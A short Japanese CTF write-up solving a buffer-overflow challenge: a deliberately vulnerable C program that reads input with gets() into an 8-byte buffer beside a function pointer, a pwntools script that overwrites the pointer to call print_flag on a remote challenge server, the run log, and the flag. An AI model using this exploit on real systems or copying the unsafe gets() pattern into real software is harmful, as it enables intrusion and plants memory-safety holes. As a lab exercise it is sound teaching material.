## danger of buffer overflow

与えられたCソースコード
```
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

void print_flag() {
  char flag[256];
  int fd = open("./flag.txt", O_RDONLY);
  if (fd < 0) { puts("./flag.txt not found"); return; }
  write(1, flag, read(fd, flag, sizeof(flag)));
}

void bye() {
  puts("bye!");
}

int main() {
  setbuf(stdout, NULL);

  char buf[8];
  void (*funcptr)() = bye;
  
  printf("address of print_flag func: %p\n", print_flag);
  printf("gets to buf: ");
  gets(buf);
  printf("content of funcptr: %p\n", funcptr);
  funcptr();
  return 0;
}

```

buf のサイズは 8 バイト
gets(buf) はサイズ制限なし
buf の すぐ上に funcptr がある
buf に 9バイト以上 を入力すれば funcptr を上書きできる

```
from pwn import *

# `print_flag` のアドレス
print_flag_addr = 0x404126

# ペイロード作成
payload = b"A" * 8  # buf を埋める
payload += p64(print_flag_addr)  # funcptr に `print_flag` のアドレスを書き込む

# nc で接続して送信
p = remote("34.170.146.252", 24310)
p.recvuntil("gets to buf: ")
p.sendline(payload)
p.interactive()

```
```
~/ctf/alpaca/seccon$ python3 exploit.py 
[+] Opening connection to 34.170.146.252 on port 24310: Done
/home/****/ctf/alpaca/seccon/buffer.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("gets to buf: ")
[*] Switching to interactive mode
content of funcptr: 0x404126
Alpaca{1_r3ally_d0nt_w4nt_t0_us3_g3t5}
[*] Got EOF while reading in interactive
```
### Flag
`Alpaca{1_r3ally_d0nt_w4nt_t0_us3_g3t5}`